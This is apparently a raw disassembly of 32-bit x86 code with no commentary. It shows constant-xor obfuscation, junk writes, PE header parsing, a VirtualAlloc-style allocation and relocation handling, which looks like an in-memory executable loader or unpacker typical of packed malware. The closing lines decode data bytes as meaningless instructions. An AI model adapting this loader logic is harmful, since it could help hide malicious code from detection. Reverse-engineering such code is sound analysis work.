  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	add    WORD PTR fs:[ebp+0x13],dx
  42060a:	or     BYTE PTR [ebx+0x1fe0001],al
  420610:	add    BYTE PTR [eax],al
  420612:	(bad)  
  420613:	pop    esi
  420614:	loope  0x4205dd
  420616:	push   ecx
  420617:	pop    edi
  420618:	and    edx,DWORD PTR [ebp+0x45b7e66e]
  42061e:	mov    ds:0x937292f5,eax
  420623:	lds    ebx,FWORD PTR [eax-0x1c089a59]
  420629:	sub    eax,0x68774c8e
  42062e:	push   edx
  42062f:	mov    BYTE PTR [esi+ebx*8+0x51],0x2a
  420634:	fpatan 
  420636:	or     cl,BYTE PTR [esi]
  420638:	daa    
  420639:	mov    ss,WORD PTR [ecx]
  42063b:	jle    0x420648
  42063d:	pop    ebx
  42063e:	push   ds
  42063f:	jns    0x4205e8
  420641:	cmp    esp,DWORD PTR [esi+0x5e]
  420644:	test   al,dl
  420646:	es retf 0x162e
  42064a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42064b:	out    dx,al
  42064c:	lds    edx,FWORD PTR [esi-0x1638429e]
  420652:	scas   al,BYTE PTR es:[edi]
  420653:	inc    ecx
  420654:	cmp    al,0x61
  420656:	fsubr  DWORD PTR [edi-0x3fa5134]
  42065c:	jno    0x420606
  42065e:	cmp    al,0xa8
  420660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420661:	or     BYTE PTR [edi],0x7
  420664:	imul   ebx,DWORD PTR [edx-0x50d24edd],0xffffffee
  42066b:	push   0x48
  42066d:	call   0xbf3ff9f3
  420672:	or     ecx,edi
  420674:	sub    DWORD PTR [eax],esi
  420676:	push   ecx
  420677:	cwde   
  420678:	dec    eax
  420679:	jg     0x420604
  42067b:	push   ss
  42067c:	adc    dh,BYTE PTR [edx-0x2702b215]
  420682:	repz mov ebx,edx
  420685:	adc    eax,0x41070aad
  42068a:	test   DWORD PTR ss:[edx-0x34],esp
  42068e:	push   ebx
  42068f:	pop    esp
  420690:	push   esp
  420691:	mov    esp,0xc1b1cfab
  420696:	ds mov cl,0x10
  420699:	in     al,dx
